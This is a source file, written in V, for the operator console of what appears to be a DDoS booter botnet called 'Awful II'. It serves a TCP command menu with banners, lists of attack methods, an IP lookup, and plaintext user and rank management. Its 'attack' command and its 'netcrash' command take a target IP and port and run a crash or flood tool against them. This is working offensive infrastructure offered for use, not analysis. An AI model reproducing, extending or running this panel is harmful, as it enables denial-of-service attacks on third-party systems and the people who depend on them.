module asset

import os
import commands
import term
import net.http
import net
import io
import time
import utils
import exploits

  fn second_function(mut socket net.TcpConn) {
    output := os.execute("C:/Users/mikail/Desktop/sum/Auth.GG-CSharp-master/Auth.GG-CSharp-master/WinForm Example/Auth.GG Winform Example/bin/Release/v/test/lol.txt")
    for{
    socket.write_string("\n$output") or {0}
    }
  }

  pub fn banner(mut conn net.TcpConn){
  mut database := commands.get_db(mut conn)
  mut read := io.new_buffered_reader(reader: conn)
  mut u := utils.CLI{}
  mut c_s := utils.Wocky_Settings{}
  u.set_title(mut conn, "Awful II")
  u.resize_terminal(mut conn, 24, 80)
  mut news := os.read_file("/root/c2/banner/motd.txt") or {return}
  mut banner2 := '\x1b[38;2;238;130;238m⽮ \x1b[38;2;0;128;0mawful \x1b[38;2;238;130;238m⽮ \x1b[38;2;0;255;255m〘 \x1b[38;2;245;245;245m𝓜𝓞𝓣𝓓:[38;2;255;153;0m $news \x1b[38;2;0;255;255m〙\x1b[38;2;255;0;255mINSTA: [38;2;0;3;173m@[38;2;13;5;177mm[38;2;26;7;181mi[38;2;39;9;185mn[38;2;52;11;189mt[38;2;65;13;193my[38;2;78;15;197mp[38;2;91;17;201ml[38;2;104;19;205mu[38;2;117;21;209mg[38;2;130;23;213mz
  [0;00m\r\n'
      conn.write_string(banner2) or {0}
  mut banner := os.read_file("/root/c2/banner/banner.txt") or {return}
      conn.write_string(banner) or {0}
    
    for{
        //------------------------------------\\
        	  conn.write_string("\r\r\n[95m[[37mx[95m][37m@[95m[[37mawful[95m]->[37m") or {0}
            input := read.read_line() or {return}
        //------------------------------------\\
        if input == "methods" {
            conn.write_string("\033[2J\033[1;1H") or {0}
            meth := os.read_file('/root/c2/banner/methods.txt') or {return}
            conn.write_string(meth) or {0}
            }
        //------------------------------------\\
        if input == "awful"{
            awf := os.read_file('/root/c2/banner/awful.txt') or {return}
            conn.write_string(awf) or {0}
            }
           //------------------------------------\\
        if input == "nano"{
            nan := os.read_file('/root/c2/banner/nano.txt') or {return}
            conn.write_string(nan) or {0}
            }     
           //------------------------------------\\
        if input == "surge"{
            surg := os.read_file('/root/c2/banner/surge.txt') or {return}
            conn.write_string(surg) or {0}
            }     
        //------------------------------------\\
        if input == "lookup" {
            conn.write_string("\rip: ") or {0}
            ip1 := read.read_line() or {return}
            lookupo := http.get_text('https://proxycheck.io/v2/' + ip1 + '?vpn=1&asn=1')
            conn.write_string(lookupo) or {0}
      } 
        //------------------------------------\\
   else if input == "apis"{
            conn.write_string("\033[2J\033[1;1H") or {0}
            list := os.read_file('/root/c2/banner/apis.txt') or {return}
            conn.write_string(list) or {0}
      }
        //------------------------------------\\
   else if input == "myip" {
            conn.write_string("\033[2J\033[1;1H") or {0}
            wws := http.get_text('https://api.my-ip.io/ip')
        mut myip := '\x1b[95m ╔══════════════════════════════════╗\r\n'
            myip += '\x1b[95m ║\x1b[96m Your ip is [\x1b[31m$wws\x1b[95m\x1b[96m]\x1b[95m         ║  \r\n'
            myip += '\x1b[95m ╚══════════════════════════════════╝\r\n'
            myip += '\x1b[37m\r\n'
            conn.write_string("\033[2J\033[1;1H") or {0}
            conn.write_string(myip) or {0}
        }
        //------------------------------------\\
   else if input == "banners" || input == "banner" {
            conn.write_string("\033[2J\033[1;1H") or {0}
            mut banners := http.get_text('https://pastebin.com/raw/Vz7Mk4GM')
            conn.write_string(banners) or {0}
        } 
        //------------------------------------\\
   else if input == "cls"{
            a := os.read_file("/root/c2/commands/weed-smoking.neko.tfx") or {return}
            conn.write_string("$a") or {0}
            conn.write_string("\033[2J\033[1;1H") or {0}
            time.sleep(1 * time.second)
            conn.write_string(banner2) or {0}
            conn.write_string(banner) or {0}
      }
       //------------------------------------\\
   else if input == "netcrash"{
           conn.write_string("ip: ") or {0}
           targetip := read.read_line() or {return}
           conn.write_string("port: ") or {0}
           targetport := read.read_line() or {return}
           conn.write_string("1 or 0: ") or {0}
           buffer := read.read_line() or {return}
           conn. write_string("crash sendet!!! pls wait") or {0}
           output := os.execute("./c2/commands/netcrash $targetip $targetport $buffer")
           conn.write_string(output.output) or {0}
      }
        //------------------------------------\\x
   else if input == "discord" || input == "dc" {
            conn.write_string("\033[2J\033[1;1H") or {0}
            dc := os.read_file('/root/c2/banner/discord.txt') or {return}
            conn.write_string(dc) or {0}
        }
        //------------------------------------\\
   else if input == "test"{
            mut test := http.get_text('https://pastebin.com/raw/Bva0Ww4h')
            conn.write_string(test) or {0}
        }
        //------------------------------------\\
   else if input == "sasuke"{
            conn.write_string("\033[2J\033[1;1H") or {0}
            sasuke := os.read_file('/root/c2/banner/sasuke.txt') or {return}
            conn.write_string(sasuke) or {0}
      
      }
        //------------------------------------\\
   else if input == "popsmoke"{
            conn.write_string("\033[2J\033[1;1H") or {0}
            pop := os.read_file('/root/c2/banner/popsmoke.txt') or {return}
            conn.write_string(pop) or {0}
      
      }
       //------------------------------------\\
   else if input == "oblock"{
            mut o := http.get_text('https://gist.githubusercontent.com/jazuki1337/61c038c43f109afffe1286539e2f86c7/raw/fd78de90f7ff904e0cd02361100ea14f37668a0f/gistfile1.txt')
            conn.write_string("\033[2J\033[1;1H") or {0}
            conn.write_string(o) or {0}
         }
        //------------------------------------\\
   else if input == "chat"{        
            conn.write_string("\r\033[2J\033[1;1HUsername: ") or {0}
	          username := read.read_line() or {return}
            conn.write_string("\n$username has joined the chat!\n") or {0}
          for {
            conn.write_string("\r") or {0}
            client_data := read.read_line() or {return}
            conn.write_string("From $username | $client_data\n\r") or {return}
          }
        }
        //------------------------------------\\
   else if input == "attack"{        
           commands.do_attack(mut conn)
        }    
        //------------------------------------\\
   else if input == "adduser"{
        if  database.contains("+1+") {
            conn.write_string("\rusername: ") or {0}
            usernameadd := read.read_line() or {return}
            conn.write_string("\rpassword: ") or {0}
            passwordadd := read.read_line() or {return}
            conn.write_string("\rrank: ") or {0}
            rank := read.read_line() or {return}
            old := os.read_file("/root/c2/db/users.db") or {return} 
            os.write_file("/root/c2/db/users.db", "$old\n+$usernameadd+ +$rank+ +$passwordadd+") or {return} 
            conn.write_string("\033[2J\033[1;1H") or {0}
            conn.write_string(banner) or {0}
            } 
         }
        //------------------------------------\\
   else if input == "addnews" && database.contains("+1+"){
            conn.write_string("\rtype: ") or {0}
            inputmotd := read.read_line() or {return}
            os.write_file("/root/c2/banner/motd.txt", "$inputmotd") or {return}
            conn.write_string("\033[2J\033[1;1H") or {0}
            conn.write_string(banner) or {0}
        } 
        //------------------------------------\\
   else if input == "users" && database.contains("+1+"){
            users := os.read_file("/root/c2/db/users.db") or {return}
            conn.write_string(users) or {0}
        }
   }
}
